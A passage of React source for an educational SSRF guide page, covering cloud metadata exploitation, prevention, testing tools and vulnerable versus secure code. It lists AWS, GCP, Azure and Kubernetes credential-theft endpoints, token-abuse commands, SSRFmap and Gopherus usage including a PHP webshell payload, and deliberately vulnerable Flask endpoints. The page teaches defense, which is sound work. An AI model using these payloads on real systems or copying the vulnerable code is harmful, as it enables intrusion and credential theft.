            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">AWS Metadata Exploitation</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="AWS Metadata Endpoints">{`# Basic metadata access
http://169.254.169.254/latest/meta-data/

# Instance identity
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/ami-id

# Network information
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/mac

# IAM Credentials (THE JACKPOT!)
http://169.254.169.254/latest/meta-data/iam/info
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# User data (often contains secrets)
http://169.254.169.254/latest/user-data

# Using stolen credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity`}</CodeBlock>

              <Alert severity="warning" sx={{ mt: 2 }}>
                <AlertTitle>AWS IMDSv2 Protection</AlertTitle>
                IMDSv2 requires a session token obtained via PUT request, making SSRF exploitation harder but not impossible.
              </Alert>

              <CodeBlock title="IMDSv2 (Requires two requests)">{`# Step 1: Get token (requires PUT with header)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \\
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token to access metadata
curl -H "X-aws-ec2-metadata-token: $TOKEN" \\
  http://169.254.169.254/latest/meta-data/

# SSRF exploitation of IMDSv2 requires:
# 1. Ability to set HTTP method to PUT
# 2. Ability to set custom headers
# Much harder but some apps allow this!`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">GCP Metadata Exploitation</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="GCP Metadata Endpoints">{`# GCP requires Metadata-Flavor header
# But SSRF can sometimes inject headers!

# Basic metadata
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# Instance information
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id

# Service account token (OAuth2!)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Service account info
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes

# Project metadata
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/attributes/

# SSH keys (if stored in metadata)
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys

# Older endpoints (sometimes work without header)
http://metadata.google.internal/computeMetadata/v1beta1/`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Azure Metadata Exploitation</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Azure Metadata Endpoints">{`# Azure Instance Metadata Service (IMDS)
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Identity token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Instance details
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01

# Network info
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01

# Custom data / user data
http://169.254.169.254/metadata/instance/compute/customData?api-version=2021-02-01

# Scheduled events
http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01

# Using stolen token
curl -H "Authorization: Bearer $TOKEN" \\
  https://management.azure.com/subscriptions?api-version=2020-01-01`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Kubernetes Metadata</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Kubernetes Internal Access">{`# Kubernetes API Server
https://kubernetes.default.svc/
https://kubernetes.default.svc.cluster.local/

# Service Account Token (mounted at)
/var/run/secrets/kubernetes.io/serviceaccount/token

# API access with service account token
curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets

# If SSRF allows file:// - read the token
file:///var/run/secrets/kubernetes.io/serviceaccount/token

# kubelet API (if accessible)
https://NODE-IP:10250/pods
https://NODE-IP:10255/pods

# etcd (if exposed)
http://etcd:2379/v2/keys/`}</CodeBlock>
            </AccordionDetails>
          </Accordion>
        </TabPanel>

        {/* Tab 4: Prevention */}
        <TabPanel value={tabValue} index={4}>
          <Typography variant="h5" gutterBottom>Preventing SSRF</Typography>

          <Alert severity="success" sx={{ mb: 3 }}>
            Defense in depth is key - combine multiple layers of protection.
          </Alert>

          <Typography variant="h6" gutterBottom>Prevention Methods</Typography>
          <Grid container spacing={2} sx={{ mb: 3 }}>
            {preventionMethods.map((item) => (
              <Grid item xs={12} sm={6} md={3} key={item.method}>
                <Card variant="outlined" sx={{ height: "100%" }}>
                  <CardContent>
                    <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
                      <Typography variant="subtitle1" fontWeight="bold" color="primary">
                        {item.method}
                      </Typography>
                      <Chip 
                        label={item.priority} 
                        size="small" 
                        color={item.priority === "Critical" ? "error" : item.priority === "High" ? "warning" : "info"}
                      />
                    </Box>
                    <Typography variant="body2" color="text.secondary">{item.desc}</Typography>
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>

          <Accordion defaultExpanded>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">URL Validation Best Practices</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Grid container spacing={2}>
                <Grid item xs={12} md={6}>
                  <Typography variant="subtitle2" fontWeight="bold" color="success.main" gutterBottom>
                    <CheckCircleIcon sx={{ verticalAlign: "middle", mr: 1 }} />
                    DO:
                  </Typography>
                  <List dense>
                    <ListItem><ListItemText primary="Use strict allowlists" secondary="Only allow specific, known-safe domains" /></ListItem>
                    <ListItem><ListItemText primary="Validate after DNS resolution" secondary="Check the resolved IP, not just hostname" /></ListItem>
                    <ListItem><ListItemText primary="Disable redirects or validate each hop" secondary="Prevent redirect-based bypasses" /></ListItem>
                    <ListItem><ListItemText primary="Use URL parsing libraries" secondary="Don't rely on regex for URL validation" /></ListItem>
                    <ListItem><ListItemText primary="Implement request timeouts" secondary="Prevent resource exhaustion attacks" /></ListItem>
                    <ListItem><ListItemText primary="Log and monitor outbound requests" secondary="Detect attempted SSRF attacks" /></ListItem>
                  </List>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Typography variant="subtitle2" fontWeight="bold" color="error.main" gutterBottom>
                    <CancelIcon sx={{ verticalAlign: "middle", mr: 1 }} />
                    DON'T:
                  </Typography>
                  <List dense>
                    <ListItem><ListItemText primary="Use blocklists alone" secondary="Too easy to bypass with encoding tricks" /></ListItem>
                    <ListItem><ListItemText primary="Trust URL validation before DNS" secondary="DNS can resolve to internal IPs" /></ListItem>
                    <ListItem><ListItemText primary="Allow arbitrary protocols" secondary="file://, gopher://, dict:// are dangerous" /></ListItem>
                    <ListItem><ListItemText primary="Return raw responses to users" secondary="Expose internal data even with blind SSRF" /></ListItem>
                    <ListItem><ListItemText primary="Trust user-supplied hostnames" secondary="Can be manipulated in many ways" /></ListItem>
                    <ListItem><ListItemText primary="Ignore SSRF in internal tools" secondary="Internal attackers exist too" /></ListItem>
                  </List>
                </Grid>
              </Grid>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Network-Level Defenses</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <List>
                <ListItem>
                  <ListItemIcon><ShieldIcon color="success" /></ListItemIcon>
                  <ListItemText 
                    primary="Network Segmentation" 
                    secondary="Web servers shouldn't be able to reach sensitive internal services directly. Use network policies to restrict access."
                  />
                </ListItem>
                <ListItem>
                  <ListItemIcon><ShieldIcon color="success" /></ListItemIcon>
                  <ListItemText 
                    primary="Block Metadata Endpoints" 
                    secondary="Use iptables/firewall rules to block 169.254.169.254 from application servers."
                  />
                </ListItem>
                <ListItem>
                  <ListItemIcon><ShieldIcon color="success" /></ListItemIcon>
                  <ListItemText 
                    primary="Egress Filtering" 
                    secondary="Control which external hosts your servers can reach. Use proxy servers for outbound requests."
                  />
                </ListItem>
                <ListItem>
                  <ListItemIcon><ShieldIcon color="success" /></ListItemIcon>
                  <ListItemText 
                    primary="Use IMDSv2 on AWS" 
                    secondary="Requires session tokens for metadata access, making SSRF exploitation significantly harder."
                  />
                </ListItem>
                <ListItem>
                  <ListItemIcon><ShieldIcon color="success" /></ListItemIcon>
                  <ListItemText 
                    primary="Zero Trust Architecture" 
                    secondary="Assume breach; require authentication for all internal service communication."
                  />
                </ListItem>
              </List>

              <CodeBlock title="AWS: Enforce IMDSv2">{`# Enforce IMDSv2 via AWS CLI
aws ec2 modify-instance-metadata-options \\
  --instance-id i-1234567890abcdef0 \\
  --http-tokens required \\
  --http-endpoint enabled

# Terraform
resource "aws_instance" "example" {
  metadata_options {
    http_tokens   = "required"
    http_endpoint = "enabled"
  }
}`}</CodeBlock>

              <CodeBlock title="Block Metadata with iptables">{`# Block access to metadata service
iptables -A OUTPUT -d 169.254.169.254 -j DROP

# Block link-local range
iptables -A OUTPUT -d 169.254.0.0/16 -j DROP

# Allow only specific users (e.g., root for legitimate use)
iptables -A OUTPUT -m owner --uid-owner root -d 169.254.169.254 -j ACCEPT
iptables -A OUTPUT -d 169.254.169.254 -j DROP`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Cloud Provider Hardening</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Typography variant="subtitle2" fontWeight="bold" gutterBottom>AWS</Typography>
              <List dense>
                <ListItem><ListItemText primary="Enable IMDSv2 and disable IMDSv1" /></ListItem>
                <ListItem><ListItemText primary="Use VPC endpoints for AWS services" /></ListItem>
                <ListItem><ListItemText primary="Restrict IAM roles to minimum permissions" /></ListItem>
                <ListItem><ListItemText primary="Use AWS WAF to block SSRF patterns" /></ListItem>
              </List>
              
              <Typography variant="subtitle2" fontWeight="bold" gutterBottom sx={{ mt: 2 }}>GCP</Typography>
              <List dense>
                <ListItem><ListItemText primary="Use Workload Identity instead of service account keys" /></ListItem>
                <ListItem><ListItemText primary="Restrict service account permissions" /></ListItem>
                <ListItem><ListItemText primary="Enable VPC Service Controls" /></ListItem>
              </List>

              <Typography variant="subtitle2" fontWeight="bold" gutterBottom sx={{ mt: 2 }}>Azure</Typography>
              <List dense>
                <ListItem><ListItemText primary="Use Managed Identities with minimum permissions" /></ListItem>
                <ListItem><ListItemText primary="Configure Network Security Groups" /></ListItem>
                <ListItem><ListItemText primary="Enable Azure Firewall for egress filtering" /></ListItem>
              </List>
            </AccordionDetails>
          </Accordion>
        </TabPanel>

        {/* Tab 5: Tools */}
        <TabPanel value={tabValue} index={5}>
          <Typography variant="h5" gutterBottom>SSRF Testing Tools</Typography>

          <Grid container spacing={2} sx={{ mb: 3 }}>
            {ssrfTools.map((tool) => (
              <Grid item xs={12} sm={6} md={4} key={tool.name}>
                <Card variant="outlined" sx={{ height: "100%" }}>
                  <CardContent>
                    <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 1 }}>
                      <Typography variant="h6" fontWeight="bold">{tool.name}</Typography>
                      <Chip label={tool.type} size="small" color="primary" variant="outlined" />
                    </Box>
                    <Typography variant="body2" color="text.secondary">{tool.desc}</Typography>
                  </CardContent>
                </Card>
              </Grid>
            ))}
          </Grid>

          <Accordion defaultExpanded>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">SSRFmap Usage</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="SSRFmap Examples">{`# Install SSRFmap
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip install -r requirements.txt

# Basic scan
python ssrfmap.py -r request.txt -p url -m readfiles

# Request file format (request.txt):
GET /fetch?url=XXXX HTTP/1.1
Host: vulnerable-site.com
Cookie: session=abc123

# Available modules:
# - readfiles: Read local files via file://
# - portscan: Scan internal ports
# - networkscan: Scan internal network
# - aws: Extract AWS metadata
# - gce: Extract GCP metadata
# - alibaba: Extract Alibaba Cloud metadata

# AWS metadata extraction
python ssrfmap.py -r request.txt -p url -m aws

# Internal port scan
python ssrfmap.py -r request.txt -p url -m portscan`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Gopherus - Gopher Payload Generator</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Gopherus Usage">{`# Install Gopherus
git clone https://github.com/tarunkant/Gopherus
cd Gopherus
chmod +x gopherus.py

# Generate Redis payload
python gopherus.py --exploit redis

# Generate MySQL payload
python gopherus.py --exploit mysql

# Generate FastCGI payload (PHP-FPM)
python gopherus.py --exploit fastcgi

# Generate Memcached payload
python gopherus.py --exploit phpmemcache

# Example: Redis RCE via webshell
# Gopherus will prompt for:
# - PHP file location: /var/www/html/shell.php
# - PHP code: <?php system($_GET['cmd']); ?>`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Nuclei SSRF Templates</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Using Nuclei for SSRF Detection">{`# Install nuclei
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Run SSRF templates
nuclei -u https://target.com -tags ssrf

# Run with interactsh for OOB detection
nuclei -u https://target.com -tags ssrf -iserver https://interact.sh

# Custom SSRF template
id: custom-ssrf-test
info:
  name: Custom SSRF Test
  severity: high
  tags: ssrf

requests:
  - method: GET
    path:
      - "{{BaseURL}}/fetch?url={{interactsh-url}}"
      - "{{BaseURL}}/proxy?target={{interactsh-url}}"
      - "{{BaseURL}}/api/webhook?callback={{interactsh-url}}"
    
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Burp Suite SSRF Testing</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="Burp Collaborator SSRF Testing">{`# Using Burp Collaborator for blind SSRF

1. Open Burp Suite Professional
2. Go to Burp > Collaborator client
3. Click "Copy to clipboard" to get your Collaborator URL

4. Insert Collaborator URL in potential SSRF parameters:
   - url=http://YOUR-ID.burpcollaborator.net
   - callback=http://YOUR-ID.burpcollaborator.net
   - redirect=http://YOUR-ID.burpcollaborator.net

5. Check Collaborator client for interactions:
   - HTTP requests (indicates SSRF)
   - DNS lookups (indicates partial SSRF)

# Useful Burp extensions for SSRF:
- Collaborator Everywhere: Auto-inject Collaborator URLs
- Param Miner: Discover hidden parameters
- Logger++: Enhanced logging for analysis

# Intruder payloads for SSRF testing:
127.0.0.1
localhost
0.0.0.0
[::1]
169.254.169.254
metadata.google.internal`}</CodeBlock>
            </AccordionDetails>
          </Accordion>
        </TabPanel>

        {/* Tab 6: Code Examples */}
        <TabPanel value={tabValue} index={6}>
          <Typography variant="h5" gutterBottom>Code Examples</Typography>

          <Alert severity="info" sx={{ mb: 3 }}>
            Compare vulnerable implementations with their secure counterparts across multiple languages.
          </Alert>

          <Accordion defaultExpanded>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Vulnerable Code (Python)</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="vulnerable_ssrf.py">{`# VULNERABLE - Do not use in production!
import requests
from flask import Flask, request

app = Flask(__name__)

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    # No validation! Attacker can specify any URL
    response = requests.get(url)
    return response.text

@app.route('/webhook')
def webhook():
    callback_url = request.json.get('callback')
    # Blindly making requests to user-supplied URLs
    requests.post(callback_url, json={'status': 'complete'})
    return {'status': 'sent'}

@app.route('/preview')
def preview():
    url = request.args.get('url')
    # Even checking the scheme is not enough!
    if url.startswith('http'):
        return requests.get(url).text
    return 'Invalid URL'`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion defaultExpanded>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Secure Code (Python)</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="secure_ssrf.py">{`import requests
import ipaddress
from urllib.parse import urlparse
import socket
from flask import Flask, request, abort
import logging

app = Flask(__name__)
logger = logging.getLogger(__name__)

# Strict allowlist of permitted domains
ALLOWED_DOMAINS = {'api.example.com', 'cdn.example.com', 'trusted-partner.com'}

# IP ranges that should NEVER be accessed
BLOCKED_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),      # Localhost
    ipaddress.ip_network('10.0.0.0/8'),       # Private
    ipaddress.ip_network('172.16.0.0/12'),    # Private
    ipaddress.ip_network('192.168.0.0/16'),   # Private
    ipaddress.ip_network('169.254.0.0/16'),   # Link-local (metadata!)
    ipaddress.ip_network('::1/128'),          # IPv6 localhost
    ipaddress.ip_network('fc00::/7'),         # IPv6 private
    ipaddress.ip_network('fe80::/10'),        # IPv6 link-local
]

# Only allow these schemes
ALLOWED_SCHEMES = {'http', 'https'}

def is_ip_blocked(ip_str: str) -> bool:
    """Check if an IP address is in a blocked range."""
    try:
        ip = ipaddress.ip_address(ip_str)
        for blocked in BLOCKED_RANGES:
            if ip in blocked:
                return True
        return False
    except ValueError:
        return True  # Invalid IP = blocked

def resolve_and_validate(hostname: str) -> str | None:
    """Resolve hostname and validate the IP is safe."""
    try:
        # Get all IP addresses for the hostname
        _, _, ip_list = socket.gethostbyname_ex(hostname)
        
        # Check ALL resolved IPs
        for ip in ip_list:
            if is_ip_blocked(ip):
                logger.warning(f"Blocked IP {ip} for hostname {hostname}")
                return None
        
        return ip_list[0]  # Return first safe IP
    except socket.gaierror:
        return None

def is_safe_url(url: str) -> tuple[bool, str]:
    """Validate URL is safe to fetch."""
    try:
        parsed = urlparse(url)
        
        # Check scheme
        if parsed.scheme not in ALLOWED_SCHEMES:
            return False, f"Blocked scheme: {parsed.scheme}"
        
        # Check for empty hostname
        if not parsed.hostname:
            return False, "No hostname provided"
        
        # Check domain allowlist
        if parsed.hostname not in ALLOWED_DOMAINS:
            return False, f"Domain not in allowlist: {parsed.hostname}"
        
        # Resolve DNS and validate IP
        resolved_ip = resolve_and_validate(parsed.hostname)
        if not resolved_ip:
            return False, "Hostname resolves to blocked IP"
        
        # Additional: Check for suspicious port
        if parsed.port and parsed.port not in (80, 443):
            return False, f"Non-standard port: {parsed.port}"
        
        return True, "OK"
        
    except Exception as e:
        logger.error(f"URL validation error: {e}")
        return False, str(e)

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url', '')
    
    # Validate the URL
    is_safe, reason = is_safe_url(url)
    if not is_safe:
        logger.warning(f"Blocked SSRF attempt: {url} - {reason}")
        abort(400, f'Invalid URL: {reason}')
    
    try:
        response = requests.get(
            url,
            allow_redirects=False,  # Don't follow redirects!
            timeout=5,              # Prevent hanging
            headers={'User-Agent': 'SafeFetcher/1.0'}
        )
        
        # Don't return internal error details
        if response.status_code >= 400:
            return {'error': 'Failed to fetch resource'}, 502
        
        return response.text
        
    except requests.exceptions.RequestException as e:
        logger.error(f"Request failed: {e}")
        return {'error': 'Request failed'}, 502`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Secure Code (Node.js)</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="secure_ssrf.js">{`const express = require('express');
const axios = require('axios');
const dns = require('dns').promises;
const { URL } = require('url');
const ipaddr = require('ipaddr.js');

const app = express();

const ALLOWED_DOMAINS = new Set(['api.example.com', 'cdn.example.com']);
const ALLOWED_SCHEMES = new Set(['http:', 'https:']);

// Check if IP is in private/blocked range
function isBlockedIP(ip) {
  try {
    const parsed = ipaddr.parse(ip);
    const range = parsed.range();
    
    // Block all non-unicast addresses
    const blockedRanges = [
      'loopback',
      'private',
      'linkLocal',
      'uniqueLocal',
      'unspecified',
      'reserved'
    ];
    
    return blockedRanges.includes(range);
  } catch {
    return true; // Invalid IP = blocked
  }
}

async function isSafeUrl(urlString) {
  try {
    const url = new URL(urlString);
    
    // Check scheme
    if (!ALLOWED_SCHEMES.has(url.protocol)) {
      return { safe: false, reason: 'Invalid scheme' };
    }
    
    // Check domain allowlist
    if (!ALLOWED_DOMAINS.has(url.hostname)) {
      return { safe: false, reason: 'Domain not allowed' };
    }
    
    // Resolve DNS and check all IPs
    const addresses = await dns.resolve4(url.hostname);
    for (const addr of addresses) {
      if (isBlockedIP(addr)) {
        return { safe: false, reason: 'Resolves to blocked IP' };
      }
    }
    
    return { safe: true };
  } catch (error) {
    return { safe: false, reason: error.message };
  }
}

app.get('/fetch', async (req, res) => {
  const url = req.query.url;
  
  if (!url) {
    return res.status(400).json({ error: 'URL required' });
  }
  
  const validation = await isSafeUrl(url);
  if (!validation.safe) {
    console.warn(\`Blocked SSRF: \${url} - \${validation.reason}\`);
    return res.status(400).json({ error: 'Invalid URL' });
  }
  
  try {
    const response = await axios.get(url, {
      maxRedirects: 0,      // Don't follow redirects
      timeout: 5000,        // 5 second timeout
      validateStatus: (status) => status < 400
    });
    
    res.send(response.data);
  } catch (error) {
    console.error(\`Fetch error: \${error.message}\`);
    res.status(502).json({ error: 'Failed to fetch' });
  }
});

app.listen(3000);`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Secure Code (Java)</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="SecureUrlFetcher.java">{`import java.net.*;
import java.io.*;
import java.util.*;

public class SecureUrlFetcher {
    
    private static final Set<String> ALLOWED_DOMAINS = Set.of(
        "api.example.com", "cdn.example.com"
    );
    
    private static final List<String> BLOCKED_PREFIXES = List.of(
        "127.", "10.", "192.168.", "172.16.", "172.17.", "172.18.",
        "172.19.", "172.20.", "172.21.", "172.22.", "172.23.",
        "172.24.", "172.25.", "172.26.", "172.27.", "172.28.",
        "172.29.", "172.30.", "172.31.", "169.254.", "0."
    );
    
    public static boolean isBlockedIP(String ip) {
        for (String prefix : BLOCKED_PREFIXES) {
            if (ip.startsWith(prefix)) {
                return true;
            }
        }
        // Check IPv6 loopback
        return ip.equals("::1") || ip.startsWith("fe80:");
    }
    
    public static String safeFetch(String urlString) throws Exception {
        URL url = new URL(urlString);
        
        // Check scheme
        if (!url.getProtocol().equals("http") && 
            !url.getProtocol().equals("https")) {
            throw new SecurityException("Invalid URL scheme");
        }
        
        // Check domain allowlist
        if (!ALLOWED_DOMAINS.contains(url.getHost())) {
            throw new SecurityException("Domain not allowed");
        }
        
        // Resolve and check IP
        InetAddress[] addresses = InetAddress.getAllByName(url.getHost());
        for (InetAddress addr : addresses) {
            if (isBlockedIP(addr.getHostAddress()) || 
                addr.isLoopbackAddress() ||
                addr.isSiteLocalAddress() ||
                addr.isLinkLocalAddress()) {
                throw new SecurityException("Blocked IP address");
            }
        }
        
        // Make request with restrictions
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setInstanceFollowRedirects(false);  // No redirects
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);
        
        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(conn.getInputStream()))) {
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line);
            }
            return response.toString();
        }
    }
}`}</CodeBlock>
            </AccordionDetails>
          </Accordion>

          <Accordion>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">Secure Code (Go)</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <CodeBlock title="secure_ssrf.go">{`package main

import (
    "context"
    "fmt"
    "io"
    "net"
    "net/http"
    "net/url"
    "time"
)

var allowedDomains = map[string]bool{
    "api.example.com": true,
    "cdn.example.com": true,
}

func isBlockedIP(ip net.IP) bool {
    // Check for private, loopback, link-local
    return ip.IsLoopback() ||
           ip.IsPrivate() ||
           ip.IsLinkLocalUnicast() ||
           ip.IsLinkLocalMulticast() ||
           ip.IsUnspecified()
}

func safeDialer(ctx context.Context, network, addr string) (net.Conn, error) {
    host, port, err := net.SplitHostPort(addr)
    if err != nil {
        return nil, err
    }
    
    // Resolve and check IPs
    ips, err := net.LookupIP(host)
    if err != nil {
        return nil, err
    }
    
    for _, ip := range ips {
        if isBlockedIP(ip) {
            return nil, fmt.Errorf("blocked IP: %s", ip)
        }
    }
    
    // Connect to first safe IP
    dialer := &net.Dialer{Timeout: 5 * time.Second}
    return dialer.DialContext(ctx, network, net.JoinHostPort(ips[0].String(), port))
}

func safeFetch(urlStr string) (string, error) {
    parsed, err := url.Parse(urlStr)
    if err != nil {
        return "", err
    }
    
    // Check scheme
    if parsed.Scheme != "http" && parsed.Scheme != "https" {
        return "", fmt.Errorf("invalid scheme: %s", parsed.Scheme)
    }
    
    // Check domain
    if !allowedDomains[parsed.Host] {
        return "", fmt.Errorf("domain not allowed: %s", parsed.Host)
    }
    
    // Create client with safe dialer
    client := &http.Client{
        Timeout: 10 * time.Second,
        Transport: &http.Transport{
            DialContext: safeDialer,
        },
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse // Don't follow redirects
        },
    }
    
    resp, err := client.Get(urlStr)
    if err != nil {
        return "", err
    }
    defer resp.Body.Close()
    
    body, err := io.ReadAll(resp.Body)
    return string(body), err
}`}</CodeBlock>
            </AccordionDetails>
          </Accordion>
        </TabPanel>
      </Paper>
    </Container>
    </LearnPageLayout>
  );
};

export default SSRFGuidePage;
